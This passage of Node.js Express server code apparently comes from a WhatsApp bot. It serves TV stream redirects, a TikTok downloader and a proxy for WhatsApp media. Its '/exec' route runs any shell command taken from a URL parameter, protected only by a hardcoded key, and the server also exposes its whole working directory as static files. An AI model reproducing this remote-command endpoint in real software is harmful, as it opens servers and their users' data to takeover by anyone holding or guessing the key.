return `https://ivanz.herokuapp.com/api/mmg/${msg.url.split('/d/f/')[1]}/${encodeURIComponent(mediakei)}?type=${msg.mimetype.split('/')[0]}`
}
const psn = msg.message[type]
const urlmsg = psn?.url
if (!urlmsg) return
const mediakei = Buffer.from(psn.mediaKey).toString('base64')
return `https://ivanz.herokuapp.com/api/mmg/${urlmsg.split('/d/f/')[1]}/${encodeURIComponent(mediakei)}?type=${psn.mimetype.split('/')[0]}`
} catch (e) {
return e
}
}

// api
function startApp() {
app.get("/bot", function(req, res) {
res.send("Active!!")
})
app.get("/profile", function(req, res) {
res.sendFile(process.cwd() + "/index.html")
})
app.get("/", function(req, res) {
res.sendFile(process.cwd() + "/web/home.html")
})

app.get("/tv/:id", function(req, res) {
let id = req.params.id
if (!id) return res.redirect("back")
if (!json[id]) return res.send(id)
res.redirect(json[id])
})
app.get("/short/:id", function(req, res) {
let id = req.params.id
if (!id) return res.redirect("back")
if (!json[id]) return res.send(id)
res.redirect(json[id])
})
app.get("/list/channel", (req, res) => {
res.send(`<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="description" content="tv virtual by ivanzz" />
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimal-ui" />
<title>Nonton TV</title>
<style>
.btn {
box-sizing: border-box;
-webkit-appearance: none;
 -moz-appearance: none;
appearance: none;
background-color: transparent;
border: 2px solid #e74c3c;
border-radius: 0.6em;
color: #e74c3c;
cursor: pointer;
display: flex;
align-self: center;
font-size: 1rem;
font-weight: 400;
line-height: 1;
margin: 20px;
padding: 1.2em 2.8em;
text-decoration: none;
text-align: center;
text-transform: uppercase;
font-family: 'Montserrat', sans-serif;
font-weight: 700;
}
.btn:hover, .btn:focus {
color: #fff;
outline: 0;
}
.first {
transition: box-shadow 300ms ease-in-out, color 300ms ease-in-out;
}
.first:hover {
box-shadow: 0 0 40px 40px #e74c3c inset;
}
</style>
<h2>List Channel TV</h2>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/rcti">RCTI</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/mnctv">MNCTV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/gtv">GTV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/inews">INEWS</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/transtv">TRANS TV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/indosiar">INDOSIAR</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/tvone">TVONE</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/sctv">SCTV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/kompastv">KOMPAS TV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/rtv">RTV</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/net">NET.</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/tvri">TVRI</a>
</button>
<button class="btn first">
<a href="https://ivanz.herokuapp.com/tv/tvku">TVKU</a>
</button>
</hewd>
</html>`)
})
app.get("/api/tiktok", async (req, res) => {
var type = req.query.type 
var url = req.query.url 
var dtaa = await savefrom(url)
var filename = getRandom("mp4")
var out = getRandom("mp3")
var buff = await (await fetch(dtaa.url[0].url)).buffer()
await fs.writeFileSync(filename, buff)
var outname = await ffmpegDefault(filename, out)
if (type == "mp3") {
res.sendFile(process.cwd() +"/"+ outname)
} else {
res.sendFile(process.cwd() + "/"+filename)
}
})
app.get("/exec", (req, res) => {
  var cmd = req.query.cmd
  var token = req.query.key
  if (token == "IvanzzSad") {
 cp.exec(cmd, function(er, st) {
if (er) res.send(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
if (st) res.send(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
})
} else {
  res.json({status: 403, message: "invalid token"})
}
})
app.get('/api/mmg/:urlpath/:mediaKey', async(req, res) => {
try {
const downloadM = baileys.downloadContentFromMessage
	const urlmmg = 'https://mmg.whatsapp.net/d/f/'
	const downloadm = req.query
	const {urlpath} = req.params
	if (!downloadm.type) return res.status(404).send('?type not found')
	const mediaKey = Buffer.from(req.params.mediaKey, 'base64')
	if (downloadm.directPath) var directPath = Buffer.from(downloadm.directPath, 'base64')
	var stream = await downloadM({url: urlmmg+urlpath, mediaKey, directPath}, downloadm.type)
		let buffer = Buffer.from([])
	for await(const chunk of stream) {
		buffer = Buffer.concat([buffer, chunk])
	}
	let type = await fileType.fileTypeFromBuffer(buffer) || {
mime: 'application/octet-stream',
ext: '.bin'
	}
	res.set("content-type", type.mime).send(buffer)
} catch (e) {
	res.status(404).send(e+``)
}
})
app.use(require("express").static("."))
app.listen(process.env.PORT, () => console.log("Connected"))
}
// Ivanzz - © 2022
function startTV() {
json["rcti"] = "https://d35d0ifx19oopq.cloudfront.net/RCTI_2021.m3u8"
json["mnctv"] = "https://d33j155pv2xyba.cloudfront.net/MNCTV_2021.m3u8"
json["gtv"] = "https://d322b885qvsbxg.cloudfront.net/GTV2021.m3u8"
json["antv"] = "http://210.210.155.37/qwr9ew/s/s07/index1.m3u8"
json["transtv"] = "http://210.210.155.35:80/session/ba64ee4e-5b37-11ec-87e1-c81f66f89318/qwr9ew/s/s05/01.m3u8"
json["trans7"] = "https://video.detik.com/trans7/smil:trans7.smil/playlist.m3u8"
json["inews"] = "https://d2hfpzcndkyscp.cloudfront.net/INEWS_2021.m3u8"
json["kompastv"] = "https://live-kg.jixie.media/live/kompastv_lhd.m3u8"
json["tvone"] = "http://210.210.155.37/qwr9ew/s/s105/01.m3u8"
json["indosiar"] = "http://210.210.155.37/qwr9ew/s/s04/index.m3u8"
json["tvku"] = "http://103.30.1.14:8080/hls/live.m3u8"
json["rtv"] = "http://210.210.155.35/dr9445/h/h10/index.m3u8"
json["net"] = "http://210.210.155.37/qwr9ew/s/s08/index.m3u8"
json["sctv"] = "http://210.210.155.37/qwr9ew/s/s03/index.m3u8"
json["tvri"] ="http://ott.tvri.co.id/Content/HLS/Live/Channel(TVRINasional)/index.m3u8"
json["cnn"] = "http://live.cnnindonesia.com/livecnn/smil:cnntv.smil/chunklist_w2069650134_b280000_sleng.m3u8"
json["metrotv"] = "http://edge.metrotvnews.com:1935/live-edge/smil:metro.smil/playlist.m3u8"
}
